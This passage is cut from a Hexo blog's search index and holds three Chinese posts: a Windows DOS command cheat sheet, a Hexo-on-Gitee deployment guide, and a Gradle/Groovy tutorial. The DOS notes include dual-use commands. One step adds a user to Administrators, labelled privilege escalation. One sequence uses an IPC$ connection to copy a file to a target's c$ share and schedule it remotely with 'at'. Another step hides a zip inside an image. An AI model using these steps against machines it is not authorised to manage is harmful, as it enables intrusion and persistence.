towel.blinkenlights.nl [观看ASCLL版星球大战]</p><p><strong>[输出] | clip</strong> [ |=管道符可以输出字符 clip=剪贴板 管道符快捷键：shift+] [可以联合type 部分系统无法使用 测试：win7可以使用]</p><p>&amp;&amp; [同时执行多个命令]</p><p><img src="https://app.yinxiang.com/FileSharing.action?hash=1/eb7a3359356b099beb715c1d64a7d5dc-70518" alt="img"></p><p><strong>start</strong> [运行]</p><p>mode con cols=300 lines=80 [改变窗口大小，cols=长 lines=宽]</p><p><strong>变量和引用变量与判断</strong></p><hr><p>set /p num[num也是可定义字符]=[自义定文字] <strong>[定义变量]</strong></p><p>%变量名% <strong>[引用变量]</strong> </p><p>：a [创立区间]</p><p>goto a [跳转区间]</p><p>if — [判断成立后的动作] <strong>[判断]</strong></p><p><strong>=是赋值</strong></p><p><strong>==是等于</strong></p><p><strong>用户管理和组管理</strong></p><hr><p>whoami <strong>/user</strong> [查看sid值]</p><p>whoami [显示主机名和用户名] </p><p>net user [查看所有用户]</p><p>net user [name] [passworld] [改密码or创建用户]</p><p>net user [name] [passworld] <strong>/add</strong> [创建一个新用户添加到电脑中]</p><p>net localgroup administrators [name] <strong>/add</strong> [将普通用户移入管理员用户] <strong>提权</strong></p><p>net user [name] /del [删除用户]</p><p>net user [name] /active:yes [激活禁用用户]</p><p>net user [name] /active:no [禁用用户]</p><p>组管理</p><p>net localgroup [查看所有组]</p><p>net localgroup [组name] <strong>/add</strong> [创建一个组]</p><p>net localgroup [组name] [查看一个组的成员]</p><p>net localgroup [组name] [用户] <strong>/add</strong> [将一个用户创建并添加到组里]</p><p>net localgroup [组name] [用户] <strong>/del</strong> [将一个用户从组里删除]</p><p>net localgroup [组name] <strong>/del</strong> [删除一个组]</p><p><strong>服务器与端口</strong></p><hr><p>net start [服务名] 开启服务/端口</p><p>netstat 查询当前使用端口</p><p>netstat -an [查询当前端口]</p><p>ipconfig [查询本机Ip]</p><p>ipconfig /all [查询本机IP和详细信息]</p><p>ping [ip] [检查网络流畅] <strong>-t</strong> [一直ping <strong>ctrl+c****停止</strong>] -n[修改Ping包的数量]</p><p>共享服务</p><p>net share [列出对外开放的共享文件夹//<strong>包括隐藏共享文件夹$</strong>]</p><p>net share [共享名] /del [删除共享文件夹，也可以删除共享隐藏文件夹]</p><p><strong>注释：服务器重启后会默认重新打开****默认共享</strong></p><p>net use \[ip]\ipc$ [密码] /nser:[用户名] [连接对方的<strong>空链接</strong>]</p><p>net time \[ip] [查询目标主机时间]</p><p>copy [路径] \[目标ip]\c$\ [复制文件到目标主机<strong>c</strong>盘上]</p><p>at \[目标ip] [time] [路径] [给目标主机添加计划任务]</p><p>at \[目标ip] [查看目标主机时间任务]</p><p>at \[目标ip] /del [删除目标主机时间任务]</p><p><strong>DHCP服务</strong></p><hr><p>开始DHCP服务后会自动开启67/68端口</p><p>ipconfig /release [释放地址] </p><p>ipconfig /renew [重新获取地址]</p><p><strong>端口</strong></p><hr><p>3389_远程桌面服务(<strong>RDP)</strong></p><p>445_文件共享服务 [默认微软开机自动打开共享] <strong>(SMB)</strong></p><p>23_telnet [命令行远程服务]</p><p>67/68_DHCP协议端口 [自动分配ip地址服务器]</p><p>53_DNS服务监听端口</p><p>80_WEB <strong>http协议</strong> <strong>默认端口</strong></p><p><strong>DNS</strong></p><hr><p>nslookup [域名/ip] [手动域名解析]</p><p>ipconfig /flushdns [清空本地DNS缓存]</p><p>ipconfig /displaydns [显示本地DNS缓存]</p><p><strong>WEB</strong></p><hr><p><strong>当IIS里没有发布网站时，80端口会自动关闭，发布网站后在打开80端口</strong></p><p><strong>一些创新</strong></p><hr><p><strong>图片隐藏文件.jpg</strong></p><p><strong>c</strong>opy /b 图片.jpg + 需要隐藏的文件.zip 图片.jpg -b表示一个二进位文件</p><p><strong>查看</strong></p><hr><p>按 ctrl+c 以后输入 cls 清除屏幕</p><p>ver 显示当前windows系统的版本号</p><p>winver 弹框显示当前windows系统信息</p><p>vol 显示当前分区的卷标</p><p>label 显示当前分区的卷标，同时提示输入新卷标</p><p>label c:system 设置c盘的卷标为system</p><p>time 显示或设置当前时间</p><p>date 显示或设置当前日期</p><p>ver 查看系统详细版本号</p><p>msinfo32 查看window详细版本号</p>]]></content>
      
      
      
        <tags>
            
            <tag> Dos </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>部署hexo</title>
      <link href="/NANABLOG/2019/10/18/hexo/"/>
      <url>/NANABLOG/2019/10/18/hexo/</url>
      
        <content type="html"><![CDATA[<p>本文参考了</p><p><a href="https://blog.csdn.net/weixin_45631738/article/details/104716374">https://blog.csdn.net/weixin_45631738/article/details/104716374</a></p><p><a href="https://blog.csdn.net/PaperJack/article/details/120479912">https://blog.csdn.net/PaperJack/article/details/120479912</a></p><p><a href="https://blog.csdn.net/wuxishaoshengyu/article/details/99696794">https://blog.csdn.net/wuxishaoshengyu/article/details/99696794</a></p><p>安装node.js </p><p>官网:<a href="https://nodejs.org/en">https://nodejs.org/en</a></p><p>推荐使用稳定版 LTS版本</p><p>安装Git</p><p><a href="https://git-scm.com/">https://git-scm.com/</a></p><p>测试安装是否成功</p><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">node -v</span><br><span class="line">git --version</span><br></pre></td></tr></tbody></table></figure><p>成功后开始安装Hexo</p><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br></pre></td></tr></tbody></table></figure><p>使用Hexo创建个人博客</p><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">hexo init blog </span><br></pre></td></tr></tbody></table></figure><p>gitee部署</p><p>创建仓库 保持仓库名和gitee账户名称一样</p><p>复制克隆仓库链接</p><p>打开博客根目录的配置文档_config.yml</p><figure class="highlight yaml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line"></span><br><span class="line"> <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line"></span><br><span class="line"> <span class="attr">repo:</span> <span class="string">https://gitee.com/blackcat19216811/blackcat19216811.git</span></span><br><span class="line"></span><br><span class="line"> <span class="attr">branch:</span> <span class="string">master</span></span><br><span class="line"></span><br><span class="line"> <span class="attr">message:</span> <span class="string">'new blog'</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>分别为</p><p>类型:git</p><p>repo:你的仓库链接</p><p>branch:推送的分支 默认master就可以</p><p>message:推送的msg 默认就可以</p><p>创建博文</p><p>在博客根目录使用git</p><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">hexo new helloblog</span><br></pre></td></tr></tbody></table></figure><p>完成后在source的_posts里可以看到</p><p>打开文件</p><p>编辑博文内容</p><p>最后推送到仓库</p><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">hexo g --d</span><br></pre></td></tr></tbody></table></figure><p>刷新仓库后出现内容就代表推送成功了，可以使用gitee服务中的Gitee Pages部署静态博客</p><p>一些坑</p><p>关于报错 hexo Cannot GET /</p><p>参考:<a href="https://blog.csdn.net/qq_45593330/article/details/116702792">https://blog.csdn.net/qq_45593330/article/details/116702792</a></p><p>在我使用hexo部署的时候，由于使用了主题Claudia，当我删除默认的第一条推文后,自己新建一个推文，再次在本机运行会报错，原因为没有按照默认推文的格式编写，导致无法识别，所以如果第一次使用，先不要删除默认推文，在你能显示其他推文后再删除默认推文</p><p>关于hexo加载不出静态图片比如头像等</p><p>如果你的主题自带了配置文件为你配置了头像和路径时，路径对应的文件夹会在source里，比如</p><figure class="highlight yaml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">user:</span></span><br><span class="line"></span><br><span class="line"> <span class="attr">name:</span> <span class="string">今天计划喝两吨水</span></span><br><span class="line"></span><br><span class="line"> <span class="attr">avatar:</span> <span class="string">/images/avatar.jpg</span></span><br><span class="line"></span><br><span class="line"> <span class="attr">location:</span> <span class="string">宁夏</span></span><br><span class="line"></span><br><span class="line"> <span class="attr">description:</span> <span class="string">'人可以被杀死，但不能被打败'</span></span><br><span class="line"></span><br><span class="line"> <span class="attr">footnotes:</span> <span class="comment">#footnotes</span></span><br></pre></td></tr></tbody></table></figure><p>avatar里填的路径为/images/avatar.jpg</p><p>那么我们就需要创建好文件在source/images/avatar.jpg</p><p>这样再次生成静态文件后，source里的文件也会被编译进去，就能正确显示了。</p><h1 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h1><p>使用Tags</p><p>多标签情况下：</p><figure class="highlight text"><table><tbody><tr><td class="code"><pre><span class="line">tags: [标签1,标签2,标签3]</span><br></pre></td></tr></tbody></table></figure><p>但标签情况下：</p><figure class="highlight text"><table><tbody><tr><td class="code"><pre><span class="line">tags: "标签"</span><br></pre></td></tr></tbody></table></figure><p>tip：注意需要先添加一个空格在使用引号包裹标签内容</p><p>使用</p><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">hexo clean</span><br></pre></td></tr></tbody></table></figure><p>清理缓存</p><h2 id="主题冲突"><a href="#主题冲突" class="headerlink" title="主题冲突"></a>主题冲突</h2><p>主题冲突后常见情况是明明在配置文件里已经替换了主题但是上传后却还是原来的主题并且出现了显示乱象问题</p><p>这是因为你的浏览器缓存没有清理</p>]]></content>
      
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Gradle部署</title>
      <link href="/NANABLOG/2019/10/18/gradle/"/>
      <url>/NANABLOG/2019/10/18/gradle/</url>
      
        <content type="html"><![CDATA[<h2 id="1-环境配置"><a href="#1-环境配置" class="headerlink" title="1.环境配置"></a>1.环境配置</h2><h4 id="1-1下载gradle"><a href="#1-1下载gradle" class="headerlink" title="1.1下载gradle"></a>1.1下载gradle</h4><p>官网:<a href="https://gradle.org/releases/">https://gradle.org/releases/</a></p><p>这里我使用的IDEA版本2019所以下载gradle-5.2.1</p><p>然后需在IDEA设置-找到gradle设置为本地下载的版本</p><p>gradle user home:%gradle路径%</p><p>如果Use Gradle from报错需要设置成本地 Specified location</p><h4 id="1-2配置环境变量"><a href="#1-2配置环境变量" class="headerlink" title="1.2配置环境变量"></a>1.2配置环境变量</h4><p>%GRADLE_HOME%/bin</p><h4 id="1-3测试环境配置"><a href="#1-3测试环境配置" class="headerlink" title="1.3测试环境配置"></a>1.3测试环境配置</h4><p>cmd命令</p><figure class="highlight cmd"><table><tbody><tr><td class="code"><pre><span class="line">gradle -version</span><br></pre></td></tr></tbody></table></figure><h2 id="2-IDEA创建Gradle"><a href="#2-IDEA创建Gradle" class="headerlink" title="2.IDEA创建Gradle"></a>2.IDEA创建Gradle</h2><h4 id="2-1创建gradle项目"><a href="#2-1创建gradle项目" class="headerlink" title="2.1创建gradle项目"></a>2.1创建gradle项目</h4><p>groupid: 组织名称</p><p>artifactid:项目名称</p><p>Veersion:版本号</p><p>tip:勾选 Use auto-import 自动导入包</p><p>使用你之前下载好的gradle-bin路径</p><p>其他可以直接next然后创建完成</p><h2 id="3-IDEA使用Gradle"><a href="#3-IDEA使用Gradle" class="headerlink" title="3.IDEA使用Gradle"></a>3.IDEA使用Gradle</h2><h4 id="3-1目录结构"><a href="#3-1目录结构" class="headerlink" title="3.1目录结构"></a>3.1目录结构</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">project-root</span><br><span class="line">├── build.gradle</span><br><span class="line">├── settings.gradle</span><br><span class="line">├── gradle.properties</span><br><span class="line">├── gradlew</span><br><span class="line">├── gradlew.bat</span><br><span class="line">├── src</span><br><span class="line">│   ├── main</span><br><span class="line">│   │   ├── java</span><br><span class="line">│   │   │   └── (Java源代码文件)</span><br><span class="line">│   │   ├── kotlin</span><br><span class="line">│   │   │   └── (Kotlin源代码文件)</span><br><span class="line">│   │   ├── resources</span><br><span class="line">│   │   │   └── (资源文件)</span><br><span class="line">│   │   └── webapp</span><br><span class="line">│   │       ├── WEB-INF</span><br><span class="line">│   │       │   └── web.xml</span><br><span class="line">│   │       ├── css</span><br><span class="line">│   │       │   └── (CSS文件)</span><br><span class="line">│   │       ├── js</span><br><span class="line">│   │       │   └── (JavaScript文件)</span><br><span class="line">│   │       └── index.html</span><br><span class="line">│   └── test</span><br><span class="line">│       ├── java</span><br><span class="line">│       │   └── (Java测试代码文件)</span><br><span class="line">│       ├── kotlin</span><br><span class="line">│       │   └── (Kotlin测试代码文件)</span><br><span class="line">│       └── resources</span><br><span class="line">│           └── (测试资源文件)</span><br><span class="line">└── build</span><br><span class="line">    └── (构建输出文件)</span><br></pre></td></tr></tbody></table></figure><h4 id="3-2编程语言"><a href="#3-2编程语言" class="headerlink" title="3.2编程语言"></a>3.2编程语言</h4><table><thead><tr><th>编程语言</th><th>简介</th></tr></thead><tbody><tr><td>Groovy</td><td>Groovy 是一种基于 Java 的动态编程语言。它与 Java 兼容，并且可以直接在 Gradle 构建脚本中使用。Groovy 提供了简洁、灵活的语法，具有强大的集合操作和元编程能力，使得 Gradle 构建脚本编写更加简单和易读。Groovy 语言是 Gradle 的默认脚本语言，因此大多数 Gradle 项目都使用 Groovy 编写构建脚本。</td></tr><tr><td>Kotlin</td><td>Kotlin 是一种静态类型的编程语言，也是一种与 Java 兼容的语言。Kotlin 具有现代化语法、可空类型、扩展函数等特性，使得代码更加简洁、安全和易于维护。Gradle 从 Gradle 5.0 版本开始引入对 Kotlin 作为构建脚本的支持。使用 Kotlin 编写 Gradle 构建脚本可以利用其静态类型检查和其他高级功能，提供更好的开发体验和工具支持。</td></tr></tbody></table><h4 id="3-3groovy"><a href="#3-3groovy" class="headerlink" title="3.3groovy"></a>3.3groovy</h4><ol><li><p>定义变量：</p><figure class="highlight groovy"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> name = <span class="string">"John"</span></span><br></pre></td></tr></tbody></table></figure></li><li><p>打印输出：</p><figure class="highlight groovy"><table><tbody><tr><td class="code"><pre><span class="line">println <span class="string">"Hello, ${name}"</span></span><br></pre></td></tr></tbody></table></figure></li><li><p>定义列表（数组）：</p><figure class="highlight groovy"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> colors = [<span class="string">'red'</span>, <span class="string">'green'</span>, <span class="string">'blue'</span>]</span><br></pre></td></tr></tbody></table></figure></li><li><p>定义映射（Map）：</p><figure class="highlight groovy"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> person = [<span class="attr">name:</span> <span class="string">'Alice'</span>, <span class="attr">age:</span> <span class="number">30</span>]</span><br></pre></td></tr></tbody></table></figure></li><li><p>条件语句（if-else）：</p><figure class="highlight groovy"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (age &lt; <span class="number">18</span>) {</span><br><span class="line">    println <span class="string">"未成年"</span></span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line">    println <span class="string">"成年人"</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li><li><p>循环语句（for-in）：</p><figure class="highlight groovy"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> numbers = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="keyword">for</span> (num <span class="keyword">in</span> numbers) {</span><br><span class="line">    println num</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li></ol><h4 id="3-4闭包"><a href="#3-4闭包" class="headerlink" title="3.4闭包"></a>3.4闭包</h4><h5 id="基础闭包"><a href="#基础闭包" class="headerlink" title="基础闭包"></a>基础闭包</h5><p>基础闭包是最简单的形式，它没有参数，并且只有一个执行代码块。下面是一个基础闭包的示例：</p><figure class="highlight groovy"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> basicClosure = {</span><br><span class="line">    println <span class="string">"This is a basic closure."</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">basicClosure()</span><br></pre></td></tr></tbody></table></figure><p>输出：</p><figure class="highlight groovy"><table><tbody><tr><td class="code"><pre><span class="line">This is a basic closure.</span><br></pre></td></tr></tbody></table></figure><p>在这个示例中，<code>basicClosure</code> 是一个没有参数的闭包，它的执行代码块只是打印一条消息。</p><h5 id="带参数闭包"><a href="#带参数闭包" class="headerlink" title="带参数闭包"></a>带参数闭包</h5><p>带参数的闭包允许你在闭包内部接收并使用参数。下面是一个带参数的闭包的示例：</p><figure class="highlight groovy"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> parameterizedClosure = { name -&gt;</span><br><span class="line">    println <span class="string">"Hello, ${name}!"</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">parameterizedClosure(<span class="string">"John"</span>)</span><br></pre></td></tr></tbody></table></figure><p>输出：</p><figure class="highlight groovy"><table><tbody><tr><td class="code"><pre><span class="line">Hello, John!</span><br></pre></td></tr></tbody></table></figure><p>在这个示例中，<code>parameterizedClosure</code> 是一个带有参数 <code>name</code> 的闭包。当你调用闭包时，传递的参数会在闭包内部使用。</p><h5 id="方法调用"><a href="#方法调用" class="headerlink" title="方法调用"></a>方法调用</h5><p>除了直接调用闭包，你还可以将闭包作为方法的参数或将其赋值给变量。下面是一个将闭包作为方法参数的示例：</p><figure class="highlight groovy"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> performOperation(closure, a, b) {</span><br><span class="line">    closure(a, b)</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> add = { x, y -&gt;</span><br><span class="line">    println x + y</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">performOperation(add, <span class="number">3</span>, <span class="number">5</span>)</span><br></pre></td></tr></tbody></table></figure><p>输出：</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">8</span><br></pre></td></tr></tbody></table></figure><p>在这个示例中，<code>add</code> 是一个闭包，它接收两个参数并将它们相加。然后，我们通过将 <code>add</code> 闭包作为参数传递给 <code>performOperation</code> 方法来调用闭包。</p><p>你还可以将闭包赋值给变量，并通过该变量调用闭包，就像调用普通的方法一样。下面是一个示例：</p><figure class="highlight groovy"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> closure = { name -&gt;</span><br><span class="line">    println <span class="string">"Hello, ${name}!"</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> greet = closure</span><br><span class="line"></span><br><span class="line">greet(<span class="string">"Alice"</span>)</span><br></pre></td></tr></tbody></table></figure><p>输出：</p><figure class="highlight groovy"><table><tbody><tr><td class="code"><pre><span class="line">Hello, Alice!</span><br></pre></td></tr></tbody></table></figure><p>在这个示例中，我们将闭包赋值给变量 <code>greet</code>，然后通过 <code>greet</code> 变量调用闭包。</p><h4 id="3-5配置文件"><a href="#3-5配置文件" class="headerlink" title="3.5配置文件"></a>3.5配置文件</h4><p><a href="https://mvnrepository.com/">https://mvnrepository.com/</a></p><p>build.gradle进行仓库依赖的配置</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">plugins {</span><br><span class="line">    id 'java'</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">group 'org.example'</span><br><span class="line">version '1.0-SNAPSHOT'</span><br><span class="line"></span><br><span class="line">sourceCompatibility = 1.8</span><br><span class="line"></span><br><span class="line">//指定所使用的仓库，默认是中央仓库 所有包都会从这里下载到本地</span><br><span class="line">//先在maven本地仓库寻找jar没有再去中央仓库</span><br><span class="line">repositories {</span><br><span class="line">    mavenLocal()</span><br><span class="line">    mavenCentral()</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">//gradle工程所有的jar包坐标都在dependencies属性内放置</span><br><span class="line">//group:group名 name:jar包名 version:版本号</span><br><span class="line">dependencies {</span><br><span class="line">    testCompile group: 'junit', name: 'junit', version: '4.12'</span><br><span class="line">    implementation group: 'org.springframework', name: 'spring-context', version: '5.0.2.RELEASE'</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Gradle </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
